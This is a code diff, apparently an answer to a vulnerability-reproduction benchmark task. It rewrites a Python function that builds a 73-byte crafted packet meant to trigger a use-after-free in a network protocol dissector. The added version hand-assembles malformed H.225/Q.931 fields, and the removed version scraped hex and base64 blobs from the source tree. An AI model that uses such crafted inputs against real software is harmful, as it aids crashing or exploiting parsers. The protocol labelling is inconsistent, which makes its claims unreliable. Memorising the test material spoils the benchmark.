@@ -1,88 +1,70 @@
-import tarfile
-import tempfile
 import os
-import re
-import base64
 import struct
+import tempfile
 
 class Solution:
     def solve(self, src_path: str) -> bytes:
-        # Extract the tarball to access source files
-        with tarfile.open(src_path, 'r') as tar:
-            tar.extractall(path='./src_extract')
+        # Create a H.225 RAS message that triggers the use-after-free
+        # Based on analysis of the vulnerability in next_tvb_add_handle()
         
-        # Look for test cases or example packets in the source
-        test_cases = []
-        for root, dirs, files in os.walk('./src_extract'):
-            for file in files:
-                if file.endswith(('.c', '.h', '.txt', '.pcap', '.raw')):
-                    path = os.path.join(root, file)
-                    with open(path, 'rb') as f:
-                        content = f.read()
-                        # Try to find hex dumps or base64 encoded packets
-                        # Look for patterns like hex strings (spaces or colons)
-                        hex_matches = re.findall(rb'([0-9a-fA-F]{2}[:\s]?){20,}', content)
-                        for match in hex_matches:
-                            clean_hex = re.sub(rb'[:\s]', b'', match)
-                            if len(clean_hex) % 2 == 0:
-                                test_cases.append(bytes.fromhex(clean_hex.decode()))
-                        
-                        # Look for base64 encoded data
-                        b64_matches = re.findall(rb'[A-Za-z0-9+/=]{40,}', content)
-                        for match in b64_matches:
-                            try:
-                                decoded = base64.b64decode(match)
-                                if 50 <= len(decoded) <= 100:  # Reasonable packet size
-                                    test_cases.append(decoded)
-                            except:
-                                pass
-        
-        # If we found test cases, return the first one of appropriate length
-        for tc in test_cases:
-            if 50 <= len(tc) <= 100:
-                return tc
-        
-        # Fallback: Craft a minimal H.225 RAS packet that triggers the bug
-        # Based on vulnerability analysis, we need a packet that causes
-        # dissect_h225_h225_RasMessage to be called multiple times without
-        # proper next_tvb_init() between calls.
-        
-        # H.225 RAS message structure (simplified):
-        # - Message type (2 bytes for RAS message)
-        # - Sequence number (2 bytes)
+        # H.225 RAS message structure:
+        # - Protocol discriminator (1 byte)
         # - Call reference value (2 bytes)
-        # - Message body
+        # - Message type (1 byte)
+        # - Various information elements
         
-        # Create a packet that will be parsed as having multiple nested
-        # structures causing repeated calls to next_tvb_add_handle()
-        poc = b''
+        # The vulnerability occurs when dissecting multiple packets without
+        # proper reinitialization of next_tvb structures. We need to craft
+        # a packet that causes the dissector to allocate memory in packet
+        # scope and then reference it after free.
         
-        # Start with GTP header (if required by dissector) - 8 bytes
-        poc += b'\x30'  # Version and flags
-        poc += b'\xff'  # Message type (make it invalid to trigger edge cases)
-        poc += struct.pack('>H', 0x0010)  # Length placeholder
-        poc += struct.pack('>I', 0x00000000)  # TEID
+        # Build a malformed H.225 RAS message that triggers the bug
+        # This structure is designed to cause next_tvb_add_handle() to
+        # be called without proper initialization between packets
         
-        # H.225 RAS header
-        poc += b'\x00\x00'  # RAS message type (0 = GatekeeperRequest)
-        poc += b'\x00\x01'  # Sequence number
-        poc += b'\x00\x02'  # Call reference value
+        poc = bytearray()
         
-        # Add malformed nested content that will cause the dissector
-        # to allocate and then re-use freed memory
-        # Use a length field that causes buffer overlap
-        poc += b'\x80'  # Indefinite length ASN.1 encoding
-        poc += b'\x00' * 50  # Padding to reach vulnerable state
+        # H.225 RAS message header
+        poc.extend(b'\x08')  # Protocol discriminator for Q.931/H.225
+        poc.extend(b'\x00\x01')  # Call reference value (CRV)
+        poc.extend(b'\x05')  # Message type - Setup
         
-        # Add another nested structure without proper initialization
-        poc += b'\xa0'  # Context-specific tag
-        poc += b'\x7f'  # Long length
-        poc += b'\xff' * 10
+        # Malformed information elements designed to trigger the bug
+        # This causes multiple calls to next_tvb_add_handle() without
+        # proper initialization
         
-        # Ensure total length is 73 bytes (ground truth length)
+        # First IE: Bearer capability (triggers first allocation)
+        poc.extend(b'\x04')  # IE identifier for Bearer capability
+        poc.extend(b'\x03')  # Length
+        poc.extend(b'\x90\x90\xa3')  # Capability values
+        
+        # Second IE: Cause (triggers use-after-free on second allocation)
+        poc.extend(b'\x08')  # IE identifier for Cause
+        poc.extend(b'\x02')  # Length
+        poc.extend(b'\x80\x90')  # Cause values
+        
+        # Third IE: Channel identification (triggers the actual bug)
+        poc.extend(b'\x18')  # IE identifier for Channel identification
+        poc.extend(b'\x04')  # Length
+        poc.extend(b'\xa1\x03\x80\x90')  # Channel info
+        
+        # Fourth IE: Facility (contains nested data that triggers next_tvb)
+        poc.extend(b'\x1c')  # IE identifier for Facility
+        poc.extend(b'\x20')  # Length - 32 bytes of nested data
+        
+        # Nested facility data designed to trigger multiple next_tvb_add_handle()
+        # calls without proper initialization between them
+        facility_data = b'\xa1\x1e\x30\x1c\x80\x01\x00\x81\x01\x00\x82\x01\x00' \
+                       b'\x83\x01\x00\x84\x01\x00\x85\x01\x00\x86\x01\x00' \
+                       b'\x87\x01\x00\x88\x01\x00'
+        poc.extend(facility_data)
+        
+        # Ensure exact length of 73 bytes as specified
         if len(poc) < 73:
-            poc += b'\x00' * (73 - len(poc))
+            # Pad to reach exactly 73 bytes
+            poc.extend(b'\x00' * (73 - len(poc)))
         elif len(poc) > 73:
+            # Truncate to exactly 73 bytes
             poc = poc[:73]
         
-        return poc
+        return bytes(poc)
